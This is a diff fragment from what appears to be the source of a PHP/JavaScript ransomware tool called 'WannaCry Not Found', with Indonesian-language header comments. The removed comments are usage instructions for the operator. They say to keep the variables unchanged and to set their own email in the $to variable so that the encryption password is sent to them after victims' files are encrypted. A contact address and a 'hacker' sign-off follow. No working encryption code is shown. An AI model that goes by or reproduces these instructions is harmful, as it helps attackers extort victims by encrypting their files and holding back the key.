@@ -3,18 +3,6 @@
 Nama Ransomware : WannaCry Not Found
 Tanggal Awal Pembuatan : Kamis 3 Juni 2019
 Tanggal Rilis : 10 Juni 2019
-
-[message]
-Jangan Gunakan Script Ini Dengan Sembarangan.
-
-[Note]
-Jangan Pernah Mengubah Variable Atau Fungsi Dari Script Jika Tidak Mau Ada Kesalahan Dalam Menggunakan Ransomeware Nya
-
-Jika Ingin Password Ransomewarenya Masuk Ke Email Kalian Ubah Email Yang Ada Di Variable $to Yang Ada Di Line/Baris 73 Menjadi Email Kalian
-Sandi Akan Terkirim Ke Email Kalian Jika Proses Encrypt Nya Telah Selesai Dan Muncul Pemberitahuan (Berhasil).
-
-Jika Ada Masalah Hub : raskrea123@gmail.com
-[ Salam Hacker ]
 */
 ?>
 <Script Language='Javascript'>
